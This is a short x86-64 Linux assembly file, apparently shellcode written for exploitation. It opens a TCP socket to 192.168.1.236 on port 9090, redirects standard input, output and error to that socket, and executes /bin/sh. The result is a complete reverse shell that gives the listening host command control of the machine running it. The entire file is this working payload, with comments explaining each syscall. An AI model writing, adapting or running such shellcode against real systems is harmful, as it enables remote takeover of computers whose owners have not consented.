.global _start
_start:
.intel_syntax noprefix
# Socket
xor rax, rax
add rax, 41 #Socket sysnum 41
xor rdi, rdi 
mov rdx, rdi 
add rdi, 2 #AF_INET
xor rsi, rsi
add rsi, 1 #SOCK_STREAM
syscall

#Connect
xor rbx, rbx 
push rbx # 8 byte padding
mov DWORD PTR [rsp-4], 0xec01a8c0 #s_adddr 192.168.1.236
mov WORD PTR [rsp-6], 0x8223 #s_port 9090
mov WORD PTR [rsp-8], 0x2 #AF_INET
sub rsp, 8 
mov rdi, rax #socket fd
mov rsi, rsp
mov rdx, 16
push rax #save fd
mov rax, 42
syscall

#dup2
pop rdi
mov rsi, 2 
mov rax, 0x21
syscall
dec rsi
mov rax, 0x21
syscall
dec rsi
mov rax, 0x21
syscall

#execve
xor rax, rax
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
push rax
mov rdx, rsp
push rdi
mov rsi, rsp
add rax, 59
syscall
